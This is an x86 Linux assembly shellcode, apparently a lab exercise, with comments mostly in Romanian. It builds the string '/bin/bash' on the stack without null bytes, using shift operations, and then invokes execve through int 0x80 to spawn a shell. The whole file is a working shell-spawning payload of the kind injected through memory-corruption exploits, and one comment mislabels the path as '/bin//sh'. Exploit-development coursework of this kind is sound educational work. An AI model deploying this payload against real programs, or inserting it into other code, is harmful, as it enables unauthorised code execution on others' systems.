section .text
  global _start
    _start:
      ; Store the argument string on stack
      xor  eax, eax 
      push eax          ; Use 0 to terminate the string
      mov edx, "h///"   ; se initializeaza registrul edx cu "h///" ce insemana ca nu contine niciun octet de 0
      ;deoarece avem  codificare little endian, registrul h- va fi ultimul (cel mai din dreapta) octet
      shl edx, 24       ; se shifteaza la stanga astfel incat octetul cel mai din drepata (h) va ajunge pe primul octet ar registrului edx
      shr edx, 24       ; se deplaseaza primul octet al registrului pana pe pozitia cea mai din drepta, astfel h-ul va fi pe octetul 
      ; cel mai din drepta; => continutul registrului edx va fi x00x00x00x68 => unde 68 e codul ascii al lui h
      push edx          ;se pune pe stiva "h000"
      push "/bas"       ;se pune pe o parte din comanda bash 
      push "/bin"       ;se pune pe stiva prima parte din comanda utilizata pentru pornirea unui bashss
      mov  ebx, esp     ; Get the string address

      ; Construct the argument array argv[]
      push eax          ; argv[1] = 0
      push ebx          ; argv[0] points "/bin//sh"
      mov  ecx, esp     ; Get the address of argv[]
   
      ; For environment variable 
      xor  edx, edx     ; No env variables 

      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b
      int 0x80
